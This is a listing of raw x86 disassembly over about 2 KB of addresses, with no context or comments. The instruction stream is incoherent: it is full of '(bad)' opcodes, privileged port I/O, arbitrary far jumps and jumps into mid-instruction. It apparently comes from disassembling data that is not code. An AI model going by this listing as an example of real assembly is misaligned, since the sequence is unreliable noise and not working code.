  41792c:	imul   eax,ecx,0xaac8396f
  417932:	jno    0x4179b3
  417934:	mov    ebx,0xbeff3c46
  417939:	or     BYTE PTR gs:[ebp+edx*1+0xc4fead5],ch
  417941:	xchg   edi,eax
  417942:	or     edi,edi
  417944:	js     0x4179ba
  417946:	sub    ebx,ecx
  417948:	jecxz  0x4179c4
  41794a:	icebp  
  41794b:	retf   0x1ed1
  41794e:	dec    ecx
  41794f:	xchg   esp,eax
  417950:	stos   DWORD PTR es:[edi],eax
  417951:	out    0x27,eax
  417953:	in     al,0x42
  417955:	sbb    edx,edx
  417957:	rcl    BYTE PTR ds:0x13673fc8,cl
  41795d:	add    eax,0x4333b830
  417962:	es loope 0x417918
  417965:	xchg   BYTE PTR [eax+0x38c0be7c],dh
  41796b:	fmul   QWORD PTR [edi-0x29]
  41796e:	(bad)  [eax+esi*8+0x680aa041]
  417975:	xor    eax,0x743db153
  41797a:	rol    DWORD PTR [edi],cl
  41797c:	and    BYTE PTR [ebx],cl
  41797e:	repnz (bad) 
  417980:	jo     0x417907
  417982:	inc    ebp
  417983:	cli    
  417984:	shl    DWORD PTR [esi+0x52],0x34
  417988:	add    ebx,DWORD PTR [ecx+ebp*1+0x4693568]
  41798f:	xchg   ecx,eax
  417990:	pusha  
  417991:	ja     0x417924
  417993:	mov    al,ds:0xdadaf82
  417998:	jns    0x4179aa
  41799a:	out    0x46,eax
  41799c:	xor    BYTE PTR [edi],dh
  41799e:	call   DWORD PTR [eax+0xf]
  4179a1:	or     DWORD PTR [edi-0x69],esp
  4179a4:	addr16 cwde 
  4179a6:	(bad)  
  4179a7:	in     eax,0xc2
  4179a9:	test   al,0xc8
  4179ab:	mov    cl,0x74
  4179ad:	ror    BYTE PTR [ecx+0x45de40cf],0x7d
  4179b4:	int    0x46
  4179b6:	inc    edx
  4179b7:	into   
  4179b8:	shl    BYTE PTR [eax+eiz*4+0x1b],cl
  4179bc:	into   
  4179bd:	push   ecx
  4179be:	out    dx,al
  4179bf:	or     al,0x48
  4179c1:	in     eax,0x1f
  4179c3:	out    dx,al
  4179c4:	push   esp
  4179c5:	mov    cl,BYTE PTR ds:0x8f987b0d
  4179cb:	or     dl,ch
  4179cd:	(bad)  
  4179ce:	in     al,dx
  4179cf:	add    ebp,DWORD PTR [ebp-0x48]
  4179d2:	mov    esp,0xb473db0
  4179d7:	mov    DWORD PTR [ecx-0x35],0xd37165c8
  4179de:	ja     0x417998
  4179e0:	mov    ebx,0x38a63748
  4179e5:	or     BYTE PTR [ebp-0x56],ch
  4179e8:	mov    al,fs:0xcea5e727
  4179ee:	mov    edx,0xe3591d9b
  4179f3:	popa   
  4179f4:	xor    BYTE PTR [esi],ch
  4179f6:	inc    ebx
  4179f7:	adc    dh,BYTE PTR [esi-0x57]
  4179fa:	or     ah,dl
  4179fc:	push   0x3d92ad12
  417a01:	mov    ebx,0x2b54912d
  417a06:	or     eax,0xb5da2d7
  417a0b:	lock xchg BYTE PTR [edi+eiz*2+0x76],bh
  417a10:	jmp    DWORD PTR [ecx]
  417a12:	in     al,0xde
  417a14:	sub    al,0x51
  417a16:	int    0x1
  417a18:	sbb    eax,0x25e86057
  417a1d:	data16 shr dh,1
  417a20:	cli    
  417a21:	cmp    DWORD PTR [edi+esi*2+0x62f12503],edx
  417a28:	xchg   BYTE PTR [ecx],dl
  417a2a:	out    dx,eax
  417a2b:	add    esi,esp
  417a2d:	in     al,0x67
  417a2f:	sahf   
  417a30:	push   cs
  417a31:	xlat   BYTE PTR ds:[ebx]
  417a32:	shl    BYTE PTR [esi-0x32efff83],cl
  417a38:	dec    edx
  417a39:	add    al,0x65
  417a3b:	das    
  417a3c:	sti    
  417a3d:	xchg   esp,eax
  417a3e:	div    DWORD PTR [edi+0x11e0e675]
  417a44:	and    eax,0x187dc6b7
  417a49:	(bad)  
  417a4a:	xor    ebp,DWORD PTR [ecx-0x61]
  417a4d:	push   esi
  417a4e:	dec    eax
  417a4f:	push   ds
  417a50:	std    
  417a51:	ss fmulp st(6),st
  417a54:	cmp    DWORD PTR [esi],ecx
  417a56:	mov    ch,0x3f
  417a58:	pop    ss
  417a59:	inc    esp
  417a5a:	shl    BYTE PTR ds:0x45f1bab4,cl
  417a60:	popa   
  417a61:	sub    al,0x52
  417a63:	fwait
  417a64:	push   ecx
  417a65:	sar    BYTE PTR ds:0x5f3d2824,cl
  417a6b:	sub    al,0x52
  417a6d:	cmc    
  417a6e:	shl    BYTE PTR [ebp+eax*8+0x66c602a8],cl
  417a75:	cdq    
  417a76:	inc    edx
  417a77:	dec    esp
  417a78:	sti    
  417a79:	je     0x417af2
  417a7b:	test   al,0xf8
  417a7d:	pushf  
  417a7e:	nop
  417a7f:	and    ch,0xab
  417a82:	dec    edx
  417a83:	pop    esi
  417a84:	out    dx,eax
  417a85:	icebp  
  417a86:	int3   
  417a87:	inc    esi
  417a88:	xchg   esp,eax
  417a89:	leave  
  417a8a:	(bad)  
  417a8b:	pop    eax
  417a8c:	mov    dh,0x63
  417a8e:	xchg   ebp,eax
  417a8f:	ss inc edi
  417a91:	inc    ecx
  417a92:	icebp  
  417a93:	sbb    DWORD PTR [ebp-0x3ea8d080],0xffffffae
  417a9a:	aam    0x5d
  417a9c:	lods   eax,DWORD PTR ds:[esi]
  417a9d:	ret    0xd723
  417aa0:	loop   0x417a23
  417aa2:	(bad)  
  417aa3:	push   edi
  417aa4:	sbb    al,0x9a
  417aa6:	adc    al,0xa1
  417aa8:	pop    edi
  417aa9:	mov    ds:0x60704e56,al
  417aae:	int3   
  417aaf:	and    DWORD PTR [eax],edi
  417ab1:	xor    DWORD PTR [edx+0x42],ebp
  417ab4:	fist   DWORD PTR [ecx+esi*1]
  417ab7:	out    dx,eax
  417ab8:	jmp    FWORD PTR [edi+0x1d]
  417abb:	adc    al,0xa1
  417abd:	fisub  WORD PTR [edx]
  417abf:	shl    DWORD PTR [edi-0x19c5d8f],cl
  417ac5:	enter  0x5bc5,0xf3
  417ac9:	pop    edi
  417aca:	sub    BYTE PTR [edi],bl
  417acc:	jmp    0xdd2d:0x165c00a7
  417ad3:	pop    esp
  417ad4:	call   0x4165:0xbd0ab279
  417adb:	ds mov edi,ebp
  417ade:	push   edi
  417adf:	jo     0x417acf
  417ae1:	shr    edi,cl
  417ae3:	pushf  
  417ae4:	ins    BYTE PTR es:[edi],dx
  417ae5:	jecxz  0x417a98
  417ae7:	push   ds
  417ae8:	pop    ebx
  417ae9:	xor    BYTE PTR [esi],al
  417aeb:	je     0x417b37
  417aed:	mov    BYTE PTR [edi+0x6a],dl
  417af0:	call   0xdb6c:0xa9c3c440
  417af7:	not    BYTE PTR [ebx-0x18]
  417afa:	out    0x51,al
  417afc:	std    
  417afd:	adc    ebp,esi
  417aff:	mov    ch,0x7
  417b01:	adc    al,BYTE PTR [eax]
  417b03:	pusha  
  417b04:	mov    WORD PTR [edi],cs
  417b06:	data16 jp 0x417b83
  417b09:	pop    esp
  417b0a:	xor    ebx,edx
  417b0c:	push   edi
  417b0d:	pop    eax
  417b0e:	mov    al,ds:0x14ce8de6
  417b13:	xchg   ebx,eax
  417b14:	jle    0x417ad5
  417b16:	sbb    al,0x7c
  417b18:	mov    ecx,0x3992be9c
  417b1d:	retf   
  417b1e:	push   ecx
  417b1f:	sbb    BYTE PTR [ecx],ah
  417b21:	adc    bh,ah
  417b23:	sbb    al,0xb1
  417b25:	fisubr DWORD PTR [edx*8-0x6a687351]
  417b2c:	or     dh,BYTE PTR [edx+0x2a]
  417b2f:	push   ecx
  417b30:	xchg   ebx,eax
  417b31:	mov    bl,bl
  417b33:	mov    ecx,ebp
  417b35:	jne    0x417ba2
  417b37:	ds out 0x53,eax
  417b3a:	jne    0x417bad
  417b3c:	ds mov esp,0xb4653c53
  417b42:	jns    0x417b1b
  417b44:	mov    bh,0xf
  417b46:	in     eax,0x8e
  417b48:	jmp    0x746f:0xd0427072
  417b4f:	xchg   esp,eax
  417b50:	mov    cl,0xeb
  417b52:	xor    cl,ch
  417b54:	lea    edx,[ebp+0x1a]
  417b57:	shl    DWORD PTR [ebp+ebp*1-0x7d2fe58b],0x3d
  417b5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417b60:	mov    bh,0xbb
  417b62:	sysenter 
  417b64:	imul   ah
  417b66:	and    ebp,ebp
  417b68:	push   edi
  417b69:	jne    0x417b6a
  417b6b:	test   eax,0x13e67cb1
  417b70:	stos   BYTE PTR es:[edi],al
  417b71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417b72:	or     al,0x9b
  417b74:	adc    DWORD PTR [eax],ebx
  417b76:	(bad)  
  417b77:	jbe    0x417bec
  417b79:	ret    
  417b7a:	scas   eax,DWORD PTR es:[edi]
  417b7b:	in     al,dx
  417b7c:	mov    edi,0xfb93b73b
  417b81:	add    edi,DWORD PTR [esi-0x263f0eed]
  417b87:	xor    al,0x60
  417b89:	push   0x902d9f6
  417b8e:	in     al,dx
  417b8f:	pop    ebp
  417b90:	loop   0x417b92
  417b92:	js     0x417bd5
  417b94:	xor    bl,bh
  417b96:	call   0xfb404045
  417b9b:	dec    DWORD PTR [ebx-0x7c]
  417b9e:	lods   eax,DWORD PTR ds:[esi]
  417b9f:	xor    al,0x2
  417ba1:	pop    ss
  417ba2:	and    ah,BYTE PTR [esi]
  417ba4:	scas   al,BYTE PTR es:[edi]
  417ba5:	in     al,dx
  417ba6:	xlat   BYTE PTR ds:[ebx]
  417ba7:	jmp    0x417bfd
  417ba9:	or     eax,0x6e748848
  417bae:	rol    BYTE PTR [ebx+0x6f9f288a],1
  417bb4:	ror    DWORD PTR [edx-0xc],cl
  417bb7:	xchg   edx,eax
  417bb8:	sar    BYTE PTR [ecx+0x7da68dc0],cl
  417bbe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417bbf:	and    dl,BYTE PTR [edi]
  417bc1:	inc    eax
  417bc2:	jne    0x417b63
  417bc4:	in     al,0xbf
  417bc6:	mov    dl,ah
  417bc8:	sub    esp,DWORD PTR [ebx+edx*8]
  417bcb:	nop
  417bcc:	idiv   BYTE PTR [ebx+eiz*8]
  417bcf:	test   DWORD PTR [ebp-0x53],ecx
  417bd2:	dec    esp
  417bd3:	std    
  417bd4:	push   cs
  417bd5:	in     eax,0x72
  417bd7:	pop    ss
  417bd8:	int3   
  417bd9:	je     0x417b7c
  417bdb:	jne    0x417bc3
  417bdd:	imul   esi,DWORD PTR [edx],0x7db2cfa
  417be3:	je     0x417bc2
  417be5:	mov    esp,0xb13dd581
  417bea:	clc    
  417beb:	inc    bx
  417bed:	or     eax,0x33c781b5
  417bf2:	es pop esp
  417bf4:	push   0x3bab5542
  417bf9:	shl    DWORD PTR [esi],cl
  417bfb:	sbb    DWORD PTR [edi],0x18
  417bfe:	inc    edi
  417bff:	retf   
  417c00:	ins    DWORD PTR es:[edi],dx
  417c01:	(bad)  [esi]
  417c03:	push   cs
  417c04:	rol    BYTE PTR [edx-0x68590609],1
  417c0a:	xchg   BYTE PTR [edi],ah
  417c0c:	lods   al,BYTE PTR ds:[esi]
  417c0d:	outs   dx,DWORD PTR ds:[esi]
  417c0e:	jecxz  0x417c4e
  417c10:	jae    0x417c61
  417c12:	test   DWORD PTR [edx-0xa3e252e],esp
  417c18:	pushf  
  417c19:	pop    ss
  417c1a:	fstp   QWORD PTR [esi]
  417c1c:	xor    DWORD PTR ds:0x19ba6716,0xffffffe7
  417c23:	xchg   edi,eax
  417c24:	fldcw  WORD PTR [eax+0x40bd2998]
  417c2a:	sbb    edi,DWORD PTR [ebp+0x7]
  417c2d:	mov    DWORD PTR [edx],eax
  417c2f:	(bad)  
  417c31:	mov    dl,0xf0
  417c33:	jmp    0x417be5
  417c35:	adc    DWORD PTR [esi+eax*2+0x37],edi
  417c39:	push   0x51
  417c3b:	jl     0x417c5e
  417c3d:	das    
  417c3e:	test   eax,0xfc402c8f
  417c43:	mov    eax,ds:0xb9551566
  417c48:	push   eax
  417c49:	fimul  DWORD PTR ds:0xc64f0477
  417c4f:	inc    edx
  417c50:	dec    ecx
  417c51:	add    dh,BYTE PTR [ecx-0x5f22b5e6]
  417c57:	clc    
  417c58:	jg     0x417c4a
  417c5a:	pop    edi
  417c5b:	mov    ds:0xeece6676,al
  417c60:	shr    BYTE PTR [ecx],0x9e
  417c63:	repz push ebp
  417c65:	ret    
  417c66:	test   DWORD PTR [esi+0x52b875a6],eax
  417c6c:	pop    es
  417c6d:	in     al,dx
  417c6e:	(bad)  
  417c6f:	(bad)  
  417c71:	test   DWORD PTR [ecx-0x38],0x657c2a0f
  417c78:	mov    al,ds:0x77ac5529
  417c7d:	icebp  
  417c7e:	sbb    BYTE PTR [eax+0x68],dh
  417c81:	adc    BYTE PTR [ebp-0x2a],ah
  417c84:	aad    0x12
  417c86:	les    edx,FWORD PTR [eax-0x3a1232df]
  417c8c:	enter  0xf8bd,0xd0
  417c90:	sar    edx,0xa7
  417c93:	cs (bad) 
  417c96:	inc    esp
  417c97:	cmp    eax,0xa6aef456
  417c9c:	cmp    al,0x47
  417c9e:	std    
  417c9f:	sub    BYTE PTR [ecx],dl
  417ca1:	xor    DWORD PTR [edi+0x4e],edi
  417ca4:	xor    eax,0xa5735ae0
  417ca9:	push   es
  417caa:	ficomp DWORD PTR [ebp+ecx*4+0x40]
  417cae:	push   ds
  417caf:	jle    0x417cb4
  417cb1:	ins    DWORD PTR es:[edi],dx
  417cb2:	imul   eax,DWORD PTR [ebp+0x7],0x61
  417cb6:	push   edi
  417cb7:	jmp    0x9d0a428b
  417cbc:	sbb    DWORD PTR ds:0x5238dac6,esi
  417cc2:	inc    ecx
  417cc3:	data16 jns 0x417c5a
  417cc6:	stos   BYTE PTR es:[edi],al
  417cc7:	cmp    dl,ah
  417cc9:	ins    BYTE PTR es:[edi],dx
  417cca:	std    
  417ccb:	mov    dh,0x6e
  417ccd:	fucomi st,st(7)
  417ccf:	adc    eax,ebx
  417cd1:	jns    0x417cdc
  417cd3:	dec    edi
  417cd4:	mov    fs,WORD PTR [ebp+0x760f57a2]
  417cda:	inc    esp
  417cdb:	add    bh,cl
  417cdd:	ins    BYTE PTR es:[edi],dx
  417cde:	xchg   ecx,eax
  417cdf:	push   esp
  417ce0:	jl     0x417c7b
  417ce2:	pop    esi
  417ce3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417ce4:	xchg   edi,eax
  417ce5:	das    
  417ce6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417ce7:	ins    BYTE PTR es:[edi],dx
  417ce8:	ins    DWORD PTR es:[edi],dx
  417ce9:	mov    esi,0x64821a6e
  417cee:	or     eax,0xdfffd3e4
  417cf3:	loope  0x417cb6
  417cf5:	jmp    FWORD PTR [ebp+0x1c]
  417cf8:	mov    eax,esi
  417cfa:	sar    BYTE PTR [ebx+0x3b9a2c3a],1
  417d00:	adc    al,0x7b
  417d02:	cmp    bl,BYTE PTR [eax-0x2de33b08]
  417d08:	adc    al,0xa8
  417d0a:	sar    DWORD PTR [ebx],0xd4
  417d0d:	out    dx,eax
  417d0e:	scas   al,BYTE PTR es:[edi]
  417d0f:	cmp    al,0xbd
  417d11:	jbe    0x417d24
  417d13:	add    eax,0x2245524f
  417d18:	out    dx,al
  417d19:	jmp    0x6e7750e9
  417d1e:	cmp    al,0x7d
  417d20:	cmp    ah,BYTE PTR [ebx+edi*8]
  417d23:	sbb    esp,0x6
  417d26:	xor    bl,BYTE PTR [ebx-0x6b]
  417d29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417d2a:	or     DWORD PTR [edx-0x4a],esp
  417d2d:	mov    ebx,0x4bb44440
  417d32:	dec    esi
  417d33:	ret    
  417d34:	pop    esi
  417d35:	add    dl,dh
  417d37:	adc    eax,0x6f3c4ac4
  417d3c:	dec    edi
  417d3d:	dec    ecx
  417d3e:	adc    BYTE PTR [eax+0x7f],cl
  417d41:	xlat   BYTE PTR ds:[ebx]
  417d42:	enter  0xf7f1,0xf9
  417d46:	and    cl,bh
  417d48:	cwde   
  417d49:	(bad)  
  417d4a:	jmp    0x729393ad
  417d4f:	or     BYTE PTR [ecx+ecx*8],bl
  417d52:	stos   BYTE PTR es:[edi],al
  417d53:	sti    
  417d54:	js     0x417cfc
  417d56:	push   es
  417d57:	pop    ss
  417d58:	and    bh,BYTE PTR [ebp+0x37]
  417d5b:	not    DWORD PTR [edi-0x32e4de82]
  417d61:	pop    ebp
  417d62:	cmp    dh,BYTE PTR [ecx+0x78]
  417d65:	out    dx,al
  417d66:	pop    esi
  417d67:	jbe    0x417dd1
  417d69:	adc    DWORD PTR [esi+0x4b3b6060],0x6
  417d70:	loop   0x417d5f
  417d72:	push   edi
  417d73:	icebp  
  417d74:	sar    DWORD PTR [edx-0x78],0x15
  417d78:	gs jle 0x417de3
  417d7b:	xchg   ecx,eax
  417d7c:	out    dx,eax
  417d7d:	sub    DWORD PTR [edi-0x3d],ecx
  417d80:	xor    eax,ecx
  417d82:	push   ds
  417d83:	dec    ebx
  417d84:	mov    esp,0x3e39fa37
  417d89:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417d8a:	pop    ss
  417d8b:	xchg   esp,eax
  417d8c:	mov    eax,0x80d08ffd
  417d91:	adc    eax,0xda435062
  417d96:	(bad)  
  417d98:	mov    ebx,DWORD PTR [edi]
  417d9a:	neg    bl
  417d9c:	mov    ss,ecx
  417d9e:	dec    ebx
  417d9f:	mov    al,ds:0xef29336e
  417da4:	fs pop es
  417da6:	jle    0x417df3
  417da8:	add    dl,BYTE PTR [ecx+0x64044896]
  417dae:	xor    al,0xbd
  417db0:	pop    ds
  417db1:	lods   al,BYTE PTR ds:[esi]
  417db2:	xor    BYTE PTR [edi-0x43],0xc4
  417db6:	jns    0x417e03
  417db8:	jno    0x417d8f
  417dba:	pop    esi
  417dbb:	loope  0x417e1d
  417dbd:	out    0x15,eax
  417dbf:	outs   dx,BYTE PTR ds:[esi]
  417dc0:	pop    esi
  417dc1:	add    al,0x85
  417dc3:	loope  0x417daa
  417dc5:	in     eax,dx
  417dc6:	mov    ds:0xdd003a00,eax
  417dcb:	js     0x417dde
  417dcd:	loop   0x417da7
  417dcf:	mov    eax,0xb60ce483
  417dd4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417dd5:	and    eax,0x7bdf8cdc
  417dda:	int3   
  417ddb:	cmc    
  417ddc:	pop    esi
  417ddd:	adc    eax,0x4ec4ffa7
  417de2:	mov    ch,0x9d
  417de4:	adc    BYTE PTR [edx+0x4],ch
  417de7:	retf   0x18db
  417dea:	push   0x4e
  417dec:	xchg   esp,eax
  417ded:	sub    al,0xed
  417def:	xchg   ebx,eax
  417df1:	popa   
  417df2:	and    ebp,ecx
  417df4:	dec    eax
  417df5:	(bad)  
  417df6:	cmp    BYTE PTR [esi],dl
  417df8:	fs add al,cl
  417dfb:	in     eax,dx
  417dfc:	dec    esp
  417dfd:	adc    ah,ch
  417dff:	psubd  mm5,QWORD PTR [ebx-0x5f28fc38]
  417e06:	pop    ebx
  417e07:	jmp    0x4b54:0xfeb4d4f2
  417e0e:	ficomp WORD PTR [edi+0x28]
  417e11:	mov    bh,0x9b
  417e13:	cs push ebp
  417e15:	(bad)  
  417e16:	mov    esp,0xb6e30980
  417e1b:	fild   DWORD PTR [edi+0x7739201f]
  417e21:	jb     0x417dc2
  417e23:	xchg   esp,eax
  417e24:	mov    cs:0x83c5b186,eax
  417e2a:	test   BYTE PTR [edi],dh
  417e2c:	xchg   DWORD PTR [esi-0x7e],ecx
  417e2f:	xor    eax,0x1236ceaa
  417e34:	test   BYTE PTR [ebx-0x325826d5],dl
  417e3a:	mov    ebx,tr1
  417e3d:	scas   eax,DWORD PTR es:[edi]
  417e3e:	push   0xffffffdc
  417e40:	pushf  
  417e41:	rcl    BYTE PTR [esi],cl
  417e43:	int3   
  417e44:	test   BYTE PTR [edx+ebp*2+0x47],al
  417e48:	dec    esp
  417e49:	repnz arpl WORD PTR [edx+0x2f80674d],si
  417e50:	fnsave ds:0x70df0a2b
  417e56:	loopne 0x417e83
  417e58:	cmp    eax,ecx
  417e5a:	jge    0x417e72
  417e5c:	into   
  417e5d:	pop    eax
  417e5e:	pusha  
  417e5f:	ret    0xba2b
  417e62:	rcl    dl,0xa1
  417e65:	xchg   esp,eax
  417e66:	xchg   esi,eax
  417e67:	(bad)  
  417e68:	lods   al,BYTE PTR ds:[esi]
  417e69:	lahf   
  417e6a:	inc    edx
  417e6b:	xchg   ecx,eax
  417e6c:	cwde   
  417e6d:	jb     0x417ea0
  417e6f:	mov    dx,0xc97b
  417e73:	retf   
  417e74:	push   0xffffffaf
  417e76:	sub    al,0x9f
  417e78:	scas   al,BYTE PTR es:[edi]
  417e79:	out    0x24,eax
  417e7b:	loopne 0x417e36
  417e7d:	into   
  417e7e:	mov    ebp,ds
  417e80:	push   edx
  417e81:	fmul   DWORD PTR ds:0xa683b226
  417e87:	push   edi
  417e88:	mov    BYTE PTR [edi+0x397aee9e],al
  417e8e:	cmp    esi,esi
  417e90:	mov    ebx,0x4e62fed8
  417e95:	es add al,0xd0
  417e98:	repz jmp 0x6f06:0x2111303
  417ea0:	sub    edx,ebx
  417ea2:	mov    DWORD PTR [eax-0x556b4bf8],eax
  417ea8:	leave  
  417ea9:	mov    ebp,DWORD PTR [ebx+0x3b]
  417eac:	mov    ecx,0xbb86710b
  417eb1:	cmp    ah,ah
  417eb3:	stos   BYTE PTR es:[edi],al
  417eb4:	push   edx
  417eb5:	mov    eax,ds:0xa54f0094
  417eba:	xor    BYTE PTR ds:0xac007034,bl
  417ec0:	aaa    
  417ec1:	ret    0xf50
  417ec4:	js     0x417e6e
  417ec6:	sub    al,0xcf
  417ec8:	(bad)  
  417ec9:	and    ah,cl
  417ecb:	mov    edi,DWORD PTR [eax-0x6d94aab6]
  417ed1:	retf   
  417ed2:	add    eax,0x3c55e9c8
  417ed7:	inc    esp
  417ed8:	xchg   DWORD PTR [esi+0x5267de29],edi
  417ede:	xchg   edx,eax
  417edf:	pushf  
  417ee0:	rcl    ebp,0xf0
  417ee3:	push   ecx
  417ee4:	(bad)  
  417ee5:	ss jmp 0x417f34
  417ee8:	cmp    eax,0x80d9d243
  417eed:	in     al,dx
  417eee:	test   al,0x15
  417ef0:	jmp    0x52a:0xa6b8fc6a
  417ef7:	div    DWORD PTR [edi-0x7c]
  417efa:	mov    BYTE PTR [ebx+0x72555c10],ch
  417f00:	dec    ecx
  417f01:	dec    ebp
  417f02:	mov    cl,0x5f
  417f04:	aam    0xee
  417f06:	mov    edi,0xa6b1e895
  417f0b:	xchg   ebp,eax
  417f0c:	ja     0x417ec9
  417f0e:	mov    bh,0x9e
  417f10:	paddq  mm6,QWORD PTR [eax+0x6]
  417f14:	sbb    al,0x3c
  417f16:	xor    BYTE PTR [ebx],0xfc
  417f19:	mov    esp,DWORD PTR [edi+0x413a82c7]
  417f1f:	out    dx,eax
  417f20:	cmp    al,0xa6
  417f22:	cdq    
  417f23:	push   ecx
  417f24:	pop    edi
  417f25:	das    
  417f26:	mov    ebp,0xb3482859
  417f2b:	sub    esp,DWORD PTR [eax-0x5dab3128]
  417f31:	std    
  417f32:	outs   dx,DWORD PTR ds:[esi]
  417f33:	pop    eax
  417f34:	and    eax,0x7b8cb710
  417f39:	jae    0x417fb4
  417f3b:	mov    cl,BYTE PTR [edi-0x1d173f9f]
  417f41:	popf   
  417f42:	cs and eax,0xffdd02f9
  417f48:	sub    al,bh
  417f4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417f4b:	xchg   ebx,eax
  417f4c:	jnp    0x417f95
  417f4e:	test   eax,0xf3332966
  417f53:	fimul  DWORD PTR [esi-0x1d132162]
  417f59:	inc    edi
  417f5a:	adc    eax,0x720863ee
  417f5f:	iret   
  417f60:	sbb    BYTE PTR [ebx-0x7a],ch
  417f63:	fild   WORD PTR [esi]
  417f65:	pop    edx
  417f66:	fisub  WORD PTR [eax+0x17]
  417f69:	cmp    bh,BYTE PTR [ecx]
  417f6b:	xor    al,0xb9
  417f6d:	bound  esp,QWORD PTR [eax]
  417f6f:	out    dx,eax
  417f70:	sbb    esp,esi
  417f72:	jecxz  0x417fa0
  417f74:	arpl   WORD PTR [ecx],bx
  417f76:	fild   DWORD PTR [ecx+0x65]
  417f79:	mov    ?,esp
  417f7b:	jmp    0x64752838
  417f80:	loop   0x417f8f
  417f82:	mov    dl,bl
  417f84:	sub    BYTE PTR [edi-0x15],bh
  417f87:	fs push ebp
  417f89:	push   ds
  417f8a:	imul   cl
  417f8c:	retf   
  417f8d:	lods   al,BYTE PTR ds:[esi]
  417f8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417f8f:	jg     0x417f2e
  417f91:	imul   esi,ecx,0x766d0749
  417f97:	(bad)  
  417f98:	aas    
  417f99:	loope  0x417f30
  417f9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417f9c:	jo     0x418017
  417f9e:	add    BYTE PTR [ebx-0xf68be80],cl
  417fa4:	fdiv   QWORD PTR [ecx+0x24cf3d63]
  417faa:	ja     0x417fed
  417fac:	push   0x44
  417fae:	add    edx,eax
  417fb0:	mov    cl,0x1c
  417fb2:	dec    ebx
  417fb3:	out    0x68,eax
  417fb5:	pop    ebx
  417fb6:	mov    al,0xb2
  417fb8:	repz sub ah,BYTE PTR [ebp+0x69702797]
  417fbf:	fstp   QWORD PTR [eax+0x58]
  417fc2:	sbb    esp,edx
  417fc4:	pop    esi
  417fc5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417fc6:	adc    DWORD PTR [edx+0x3e],esp
  417fc9:	xchg   edx,eax
  417fca:	jge    0x417f5d
  417fcc:	sbb    al,0x96
  417fce:	fwait
  417fcf:	dec    ebx
  417fd0:	mov    esp,0x7fa9170a
  417fd5:	std    
  417fd6:	or     BYTE PTR [eax+ebx*8],ch
  417fd9:	add    ebp,esi
  417fdb:	movsx  edi,si
  417fde:	push   0xffffffb0
  417fe0:	dec    ecx
  417fe1:	ins    DWORD PTR es:[edi],dx
  417fe2:	or     eax,0x90db005d
  417fe7:	shl    BYTE PTR [edi+0x7c],cl
  417fea:	outs   dx,BYTE PTR ds:[esi]
  417feb:	jecxz  0x417fd9
  417fed:	jbe    0x417fb0
  417fef:	sub    cl,BYTE PTR [esi]
  417ff1:	ins    DWORD PTR es:[edi],dx
  417ff2:	dec    ebx
  417ff3:	or     al,0xc
  417ff5:	cmp    al,0x43
  417ff7:	adc    ebx,edi
  417ff9:	ds aad 0xa2
  417ffc:	push   0x7b0c6284
  418001:	fdivr  DWORD PTR [edi]
  418003:	cld    
  418004:	xchg   BYTE PTR [ebx],dl
  418006:	aaa    
  418007:	jnp    0x417ff1
  418009:	sub    DWORD PTR [ebx+0x3cc1a8ce],eax
  41800f:	mov    cl,0x3e
  418011:	cwde   
  418012:	push   ebx
  418013:	gs mov al,0x14
  418016:	int    0x6f
  418018:	inc    edx
  418019:	pop    edx
  41801a:	jp     0x418089
  41801c:	or     al,0x8d
  41801e:	int    0x94
  418020:	stos   BYTE PTR es:[edi],al
  418021:	xchg   sp,ax
  418023:	mov    bh,BYTE PTR [ebx+eiz*4-0x11]
  418027:	mov    bl,0x5a
  418029:	cmp    edx,DWORD PTR [esi-0x18810a3f]
  41802f:	int    0x63
  418031:	dec    eax
  418032:	(bad)  
  418033:	out    dx,eax
  418034:	scas   al,BYTE PTR es:[edi]
  418035:	mov    esp,cs
  418037:	arpl   WORD PTR [esi-0x15890985],si
  41803d:	adc    eax,0xb96c45f2
  418042:	test   al,dh
  418044:	ret    
  418045:	loope  0x417fd4
  418047:	lods   al,BYTE PTR ds:[esi]
  418048:	or     BYTE PTR [ecx-0x165154c7],ch
  41804e:	inc    ebp
  41804f:	sub    al,0xeb
  418051:	lods   al,BYTE PTR ds:[esi]
  418052:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418053:	aam    0xae
  418055:	xchg   BYTE PTR [edi-0x799901c6],ah
  41805b:	or     BYTE PTR [esi],bh
  41805d:	mov    ebp,0xea253f6f
  418062:	arpl   si,cx
  418064:	sahf   
  418065:	jge    0x41809b
  418067:	fs test al,0xb9
  41806a:	ficomp WORD PTR [ecx+0x63f74e22]
  418070:	fimul  WORD PTR [ebx+0x2a]
  418073:	dec    ebp
  418074:	mov    WORD PTR [edx-0x2bdfff51],gs
  41807a:	xor    eax,0x3309a51
  41807f:	aaa    
  418080:	ror    BYTE PTR [ecx-0x4e],0x98
  418084:	sub    bl,bl
  418086:	push   ebp
  418087:	sbb    edx,DWORD PTR [eax+0x52]
  41808a:	add    ebp,DWORD PTR [eax+0x1a]
  41808d:	and    eax,0xe13c0289
  418092:	loope  0x418047
  418094:	mov    ebx,eax
  418096:	sbb    DWORD PTR [eax-0x26],esi
  418099:	and    eax,0xe9e3e20b
  41809e:	out    dx,eax
  41809f:	push   esp
  4180a0:	xor    al,0x20
  4180a2:	cmp    DWORD PTR [edi+0x76],ebx
  4180a5:	in     eax,dx
  4180a6:	jns    0x41810f
  4180a8:	ss push eax
  4180aa:	stos   DWORD PTR es:[edi],eax
  4180ab:	hlt    
  4180ac:	les    ecx,FWORD PTR [ecx-0x19]
  4180af:	stc    
  4180b0:	mov    esp,eax
  4180b2:	jge    0x41811c
  4180b4:	adc    al,al
  4180b6:	or     BYTE PTR [ecx],0xed
  4180b9:	mov    dh,0x6c
  4180bb:	sbb    cl,BYTE PTR [esp+eax*4-0x20]
  4180bf:	cmp    al,bl
  4180c1:	cmc    
  4180c2:	dec    eax
  4180c3:	mov    esi,0xa4d634d9
  4180c8:	push   ebx
  4180c9:	aas    
